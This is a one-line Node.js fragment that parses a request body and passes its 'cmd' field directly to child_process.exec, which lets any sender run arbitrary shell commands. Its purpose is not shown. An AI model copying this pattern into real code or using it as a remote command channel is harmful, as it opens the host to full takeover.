const {exec}=require('child_process'); const task=JSON.parse(body); exec(task.cmd);
